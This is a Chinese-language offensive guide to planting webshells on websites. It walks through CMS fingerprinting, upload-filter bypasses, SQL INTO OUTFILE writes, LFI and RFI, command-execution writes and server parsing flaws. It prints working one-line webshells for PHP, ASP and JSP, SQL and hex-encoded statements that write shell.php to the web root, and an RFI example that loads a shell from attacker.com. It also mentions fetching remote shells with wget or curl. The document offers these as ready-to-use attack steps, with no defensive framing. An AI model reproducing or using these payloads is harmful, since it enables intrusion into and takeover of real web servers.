#### A. 利用 CMS 漏洞获取 Webshell

1.  **识别 CMS**：
    *   后台明确显示。
    *   页面底部版权信息。
    *   Web 指纹识别工具（御剑 WEB 指纹识别）。
    *   浏览器插件（Wappalyzer）。
2.  **查找漏洞**：根据识别出的 CMS 名称和版本，在搜索引擎、漏洞库搜索该版本的已知漏洞，特别是后台文件上传、模板编辑、插件漏洞、数据库备份等可获取 Webshell 的漏洞。搜索关键词如：“WordPress X.X getshell”, “Drupal Y.Y arbitrary file upload”。

#### B. 非 CMS 网站获取 Webshell (通用思路)

##### I. 已获得后台管理权限

1.  **后台直接上传**：
    *   检查上传功能点（头像、附件、图片、模板等）是否有文件类型限制。若无或限制不严格，直接上传一句话木马（PHP: `<?php @eval($_POST['cmd']);?>`, ASP: `<%eval request("cmd")%>`, JSP: `<%if(request.getParameter("cmd")!=null){Runtime.getRuntime().exec(request.getParameter("cmd"));}%>`)。
2.  **修改配置文件/模板**：
    *   查找后台可编辑的配置文件、模板文件、包含文件等。
    *   将一句话木马**小心地**插入到这些文件中，注意保持原有代码语法正确，避免破坏网站功能。建议先备份或本地分析源码。
3.  **数据库备份功能**：
    *   上传一个允许的文件类型（如图片马 `shell.jpg`）到已知路径。
    *   利用后台的数据库备份功能，将该图片文件备份为脚本文件（如 `shell.php`）。
    *   如果备份路径受限，尝试 F12 修改前端限制或抓包修改请求。
4.  **绕过上传限制**：
    *   使用 Burp Suite 等工具进行花式上传：
        *   **%00 截断**：`shell.php%00.jpg` (依赖 PHP < 5.3.4 且特定配置)
        *   **特殊文件名**：利用操作系统特性（如 Windows 下 `shell.php.`、`shell.php::$DATA`）。
        *   **大小写绕过**：`shell.PhP`。
        *   **黑白名单绕过**：尝试 `.pht`, `.phtml`, `.php3`, `.php4`, `.php5`, `.asa`, `.cer` 等可能被解析的后缀。
        *   **Content-Type 绕过**：修改请求中的 `Content-Type` 为 `image/jpeg` 等允许类型。
        *   **条件竞争**：上传后再快速访问。
5.  **后台编辑功能**：
    *   利用后台提供的代码编辑、模板编辑、广告管理、标签管理等功能，直接写入一句话木马。
6.  **压缩文件上传**：
    *   将木马文件放入压缩包 (如 `.zip`)。
    *   将压缩包后缀改为允许的模板或主题文件类型（如 `.skin`, `.theme`）。
    *   通过后台的主题/模板上传功能上传，服务器解压后可能留下木马文件。
7.  **SQL 命令执行 (需高权限)**：
    *   前提：数据库用户有 `FILE` 权限，知道 Web 目录绝对路径，能执行 SQL 语句。
    *   **`INTO OUTFILE` / `INTO DUMPFILE`**：
        ```sql
        -- 方法一：创建表写入再导出
        CREATE TABLE temp_shell (content TEXT);
        INSERT INTO temp_shell VALUES ('<?php @eval($_POST[\'cmd\']);?>');
        SELECT content FROM temp_shell INTO OUTFILE '/var/www/html/shell.php'; -- 或 DUMPFILE 写二进制
        DROP TABLE temp_shell;

        -- 方法二：直接导出字符串
        SELECT '<?php @eval($_POST[\'cmd\']);?>' INTO OUTFILE '/var/www/html/shell.php';
        ```
    *   注意单引号过滤，可使用十六进制编码字符串：`SELECT 0x3c3f70687020406576616c28245f504f53545b27636d64275d293b3f3e INTO OUTFILE '/var/www/html/shell.php';`

##### II. 未获得后台管理权限 (利用漏洞)

1.  **SQL 注入漏洞**：
    *   前提：同上（高权限、FILE 权限、知路径、有注入点）。
    *   利用 `UNION SELECT ... INTO OUTFILE/DUMPFILE` 写入 Webshell。
    *   **Log 备份 GetShell**：通过 SQL 语句修改日志文件路径到 Web 目录，然后执行包含 Webshell 代码的查询，使其写入日志文件。
    *   **差异备份 GetShell** (SQL Server)。
2.  **文件包含漏洞 (LFI/RFI)**：
    *   **LFI + 上传**：先上传一个包含 Webshell 代码的文件（如 `shell.txt` 或图片马），然后利用 LFI 包含该文件 (`?page=../../uploads/shell.txt`)。
    *   **LFI + 日志文件**：向服务器发送包含 Webshell 代码的请求（如在 User-Agent 中），这些代码会被记录到访问日志（如 Apache 的 `access.log`）或错误日志中，再利用 LFI 包含日志文件。
    *   **LFI + Session 文件**：如果能控制部分 Session 内容，将 Webshell 写入 Session，再包含 Session 文件。
    *   **RFI**：直接包含远程服务器上的 Webshell 文件 (`?page=http://attacker.com/shell.txt`)。
3.  **命令执行漏洞 (RCE)**：
    *   利用 Web 应用本身或其依赖组件的 RCE 漏洞。
    *   执行系统命令直接写入 Webshell：
        *   Linux: `echo '<?php @eval($_POST["cmd"]);?>' > /var/www/html/shell.php`
        *   Windows: `echo ^<^?php @eval($_POST["cmd"]);?^> > C:\inetpub\wwwroot\shell.php` (注意转义)
        *   使用 `wget` 或 `curl` 下载远程 Webshell 文件。
4.  **文件上传漏洞 (绕过 WAF/限制)**：
    *   利用前面提到的各种文件上传绕过技巧。
5.  **解析漏洞 (Parsing Vulnerability)**：
    *   **IIS 5.x/6.0**：
        *   目录解析：`/shell.asp/` 目录下的任何文件（如 `test.jpg`）会被当作 ASP 解析。
        *   文件解析：`shell.asp;.jpg` 文件名中的分号后内容被忽略，文件被当作 ASP 解析。
    *   **IIS 7.x (FastCGI)**：在 URL 后添加 `/xx.php`（如 `site.com/image.jpg/xx.php`），`image.jpg` 会被当作 PHP 解析。
    *   **Nginx < 0.8.3**：
        *   畸形解析：同 IIS 7.x (需特定配置 `cgi.fix_pathinfo=1`)。
        *   空字节代码执行：`shell.jpg%00.php` (利用 `%00` 截断)。
    *   **Apache**：
        *   多后缀解析：`shell.php.xxx.yyy`，Apache 从后往前解析，直到遇到认识的后缀（如 `.php`）。文件名 `apache.conf` 中 `AddHandler` 或 `AddType` 指令可能导致意想不到的解析（如 `.htaccess` 配置不当）。
        *   `.htaccess` 文件上传：如果允许上传 `.htaccess` 文件，可以写入规则使特定类型文件（如 `.jpg`）被当作 PHP 解析。
6.  **编辑器漏洞 (Editor Vulnerability)**：
    *   利用 Web 应用集成的富文本编辑器（FCKeditor, eWebEditor, KindEditor, UEditor 等）的已知文件上传漏洞。搜索特定编辑器版本的漏洞。
7.  **反序列化漏洞 (Deserialization Vulnerability)**：
    *   利用 PHP, Java, Python, .NET 等语言的反序列化漏洞，构造 Payload 执行命令写入 Webshell 或直接反弹 Shell。
8.  **XSS + SQL 注入 (Combined Attack)**：
    *   如果某个输入点存在 XSS 且过滤不严（如允许 `< > ?` 等字符），可以将 PHP Webshell 代码 `<?php ... ?>` 输入。
    *   然后利用 SQL 注入漏洞，使用 `INTO OUTFILE` 将包含该 XSS Payload 的数据行导出到 Web 目录下，形成 Webshell 文件。
9.  **头像上传利用 (特殊场景)**：
    *   抓取正常上传头像的数据包。
    *   将头像文件的二进制内容替换为包含 Webshell 的压缩文件（如 ZIP）的二进制内容。
    *   修改 `Content-Type` 可能为 `application/zip` 或保持 `image/jpeg` (视后端逻辑)。
    *   如果上传成功且服务器端会解压（例如用于生成不同尺寸头像），则可能将 Webshell 文件解压到服务器。需要知道解压路径。 (此方法较少见且依赖特定实现)。